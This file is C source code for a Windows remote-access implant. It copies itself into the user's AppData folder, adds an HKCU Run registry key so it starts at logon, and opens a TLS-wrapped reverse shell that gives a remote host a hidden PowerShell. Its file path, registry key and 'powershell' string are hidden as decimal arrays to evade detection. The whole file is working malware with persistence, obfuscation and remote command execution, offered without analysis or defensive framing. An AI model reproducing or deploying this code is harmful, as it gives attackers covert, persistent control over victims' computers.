#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#include <schannel.h>
#include <security.h>


#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Crypt32.lib")

#ifndef IP_ADDRESS
    #define IP_ADDRESS 0
#endif

#ifndef PORT
    #define PORT 0
#endif

#define SERVER_CERT "../secret/server.crt"

void persistance(const char* newPath);
char* conv(int decimal_array[], int array_size);
DWORD WINAPI ReverseShellThread(LPVOID lpParam);
PCCERT_CONTEXT LoadServerCert(const char* serverPath);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    //Create mutex
    HANDLE mutex = CreateMutex(NULL, TRUE, "Agent");

    //Either mutex cannot be created or error 183 means mutex already exist
    if (mutex == NULL || GetLastError() == 183) {
        //ret 1 to end any extra agent
        return 1;
    }
    //Get home path
    const char* home_path = getenv("USERPROFILE");
    char filename[MAX_PATH];
    char newLocation[MAX_PATH];

    //Path to save in dec
    int decimal_array[] = {92, 65, 112, 112, 68, 97, 116, 97, 92, 76, 111, 99, 97, 108, 92, 77, 105, 99, 114, 111, 115, 111, 102, 116, 92, 87, 105, 110, 100, 111, 119, 115, 65, 112, 112, 115, 92, 97, 103, 101, 110, 116, 46, 101, 120, 101};
    //Calculate array size
    int array_size = sizeof(decimal_array) / sizeof(decimal_array[0]);
    //Convert dec array to str
    char* str = conv(decimal_array, array_size);
    //Setting Path of new location with user home path
    snprintf(newLocation, sizeof(newLocation), "%s%s", home_path,str);
    BOOL stats = 0;
    //Get file name
    DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
    CopyFile(filename, newLocation, stats);
    //If copied file already exist, go to persistance
    if (strcmp(filename, newLocation) == 0) {
        persistance(newLocation);
    } else {
        //Copy agent to new location
        if (CopyFile(filename, newLocation, stats)) {
            persistance(newLocation);
        }
    }

    CloseHandle(mutex);
    return 0;
}

void persistance(const char* newPath) {
    //Required Size for Wide Characters
    int size = MultiByteToWideChar(CP_UTF8, 0, newPath, -1, NULL, 0);
    //Allocate memory to store converted str
    wchar_t* proPath = (wchar_t*)malloc(size * sizeof(wchar_t));
    //Convert Path from char* to wchar_t* (narrow > wide char string) to match the wide character format (L"string") used in the registry functions.  
    MultiByteToWideChar(CP_UTF8, 0, newPath, -1, proPath, size);
    //hkey initalization
    HKEY hkey = NULL;
    //Registry location in dec
    int decimal_array[] = {83, 79, 70, 84, 87, 65, 82, 69, 92, 92, 77, 105, 99, 114, 111, 115, 111, 102, 116, 92, 92, 87, 105, 110, 100, 111, 119, 115, 92, 92, 67, 117, 114, 114, 101, 110, 116, 86, 101, 114, 115, 105, 111, 110, 92, 92, 82, 117, 110};
    //Calculate array size
    int array_size = sizeof(decimal_array) / sizeof(decimal_array[0]);
    //Convert dec array to str
    char* str = conv(decimal_array, array_size);
    //Create new key in windows start up
    LONG createStatus = RegCreateKeyA(HKEY_CURRENT_USER, str, &hkey);
    //Set value of key - Name is Agent, Value is String and Size is calculated
    //wcslen for len of string * size of wchar_t for data size
    LONG status = RegSetValueExW(hkey, L"Agent", 0, REG_SZ, (const BYTE *)proPath, (wcslen(proPath) + 1) * sizeof(wchar_t));
    if (status == 0) {
        HANDLE hThread = CreateThread(NULL, 0, ReverseShellThread, NULL, 0, NULL);
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}

DWORD WINAPI ReverseShellThread(LPVOID lpParam){
    SOCKET shell;
    WSADATA ver;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    struct sockaddr_in shell_addr;
    char RecData[512];
    int connection;

    //Initializing WinSock Version 2
    WSAStartup(MAKEWORD(2,2), &ver);
    //Get Port
    int port = PORT;
    //Get IP Address
    long long int ip = IP_ADDRESS;
    //IPv4
    unsigned char octets[4];
    octets[0] = (ip >> 24) & 0xFF;
    octets[1] = (ip >> 16) & 0xFF;
    octets[2] = (ip >> 8) & 0xFF;
    octets[3] = ip & 0xFF;
    //16 for Max IPv4 Length and Null Terminator
    char ip_addr[16];
    sprintf(ip_addr, "%d.%d.%d.%d", octets[0], octets[1], octets[2], octets[3]);
    //Shell Configuration
    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
    
    //Create TCP Socket for each new connection
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); 
    //Connecting to Target Server
    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR){
        //Get Error Code
        int errorCode = WSAGetLastError();
        //Close Socket if match Error Code
        if (errorCode == 10054 || errorCode == 10056){
            closesocket(shell);
        }
    }

    //Load Server Cert
    PCCERT_CONTEXT serverCert;
    serverCert = LoadServerCert(SERVER_CERT);

    //Initialize Secure Channel
    CredHandle credHandle;
    SECURITY_STATUS status;
    SCHANNEL_CRED cred = {
        .dwVersion = SCHANNEL_CRED_VERSION,
        .dwFlags = SCH_CRED_AUTO_CRED_VALIDATION //Automatically validate server cert
        | SCH_CRED_NO_DEFAULT_CREDS, //No need Client Cert
        .grbitEnabledProtocols = SP_PROT_TLS1_CLIENT, //TLS Version 1
        .paCred = &serverCert //Load Server Cert
    };

    status = AcquireCredentialsHandle(
        NULL, UNISP_NAME, SECPKG_CRED_OUTBOUND, NULL, &cred, NULL, NULL, &credHandle, NULL
    );
    //Temporary
    if (status != SEC_E_OK){
        printf("Error acquiring credentials handle");
    }
    
    //Initialize Security Context
    CtxtHandle context;
    SecBuffer outputBuffer[1] = { 0 };
    outputBuffer[0].BufferType = SECBUFFER_TOKEN;
    SecBufferDesc outputBufferDesc = {SECBUFFER_VERSION, sizeof(outputBuffer), outputBuffer};
    DWORD ctxtflags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;
    status = InitializeSecurityContext(
        &credHandle, NULL, NULL,  ctxtflags, 0, SECURITY_NATIVE_DREP, NULL, 0, &context, &outputBufferDesc, &ctxtflags, NULL
    );
    printf("InitializeSecurityContext Parameters:\n");
    printf("Status: 0x%x\n", status);
    printf("Token: %p, Token Length: %lu\n", outputBufferDesc.pBuffers[0].pvBuffer, outputBufferDesc.pBuffers[0].cbBuffer);
    printf("Security Token Content:\n");
    for (DWORD i = 0; i < outputBufferDesc.pBuffers[0].cbBuffer; ++i) {
        printf("%02x ", ((BYTE*)outputBufferDesc.pBuffers[0].pvBuffer)[i]);
    }
    printf("\n");
    if (status == SEC_I_CONTINUE_NEEDED) {
        if (send(shell,  outputBufferDesc.pBuffers[0].pvBuffer, outputBufferDesc.pBuffers[0].cbBuffer, 0) == SOCKET_ERROR) {
            printf("Error sending initial token");
    }
        //Free Allocated Memory
        FreeContextBuffer(outputBufferDesc.pBuffers[0].pvBuffer);
    } else if (status == SEC_E_OK){
        printf("Security context initialized successfully.\n");
    } else{
        printf("Error initializing security context: %d", status);
    }

    //Recv Socket, Where to Store Data, Max Size to Receive, 0
    recv(shell, RecData, sizeof(RecData), 0);   
    //Set Value of Startup Infra Buffer to 0 (& means address)
    ZeroMemory(&sinfo, sizeof(sinfo));
    //Size of Structure
    sinfo.cb = sizeof(sinfo);
    //Determines whether startup info users are used when process creates a window
    //STARTF_USESTDHANDLES - Used for Standard Input, Output and Error
    //STARTF_USESHOWWINDOW - Contains Additional Information 
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.wShowWindow = SW_HIDE;
    //Pipe Standard Input, Output and Error to Socket
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) shell;
    //powershell in dec
    int decimal_array[] = {112, 111, 119, 101, 114, 115, 104, 101, 108, 108};
    //Calculate array size
    int array_size = sizeof(decimal_array) / sizeof(decimal_array[0]);
    //Convert dec array to str
    char* str = conv(decimal_array, array_size);
    //Using CreateProcess API to spawn cmd
    //NULL, Process to Spawn, NULL, NULL, BOOLEAN, Creation Flags, NULL, NULL, Address of Startup Information Structure, Address of Process Information Structure
    CreateProcess(NULL, str, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
    //Startup Process
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    //Set Value of Receiving Server Buffer to 0
    ZeroMemory(RecData, sizeof(RecData));
    
}

char* conv(int decimal_array[], int array_size) {
    //Allocate space for memory, +1 for null terminator
    char* str = (char*)malloc(array_size + 1);
    //Convert dec array to str
    for (size_t i = 0; i < array_size; i++) {
        str[i] = (char)decimal_array[i];
    }
    //Null terminator for end of str
    str[array_size] = '\0'; 

    return str;
}

PCCERT_CONTEXT LoadServerCert(const char* serverPath){
    //Reading Cert
    HANDLE cert = CreateFile(SERVER_CERT, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD fileSize = GetFileSize(cert, NULL);
    //Allocate Memory
    BYTE* certBuffer = malloc(fileSize);
    DWORD readBytes;
    ReadFile(cert, certBuffer, fileSize, &readBytes, NULL);
    //Create Cert Context from Cert Buffer
    PCCERT_CONTEXT certContext = CertCreateCertificateContext(X509_ASN_ENCODING, certBuffer, readBytes);
    return certContext;
}
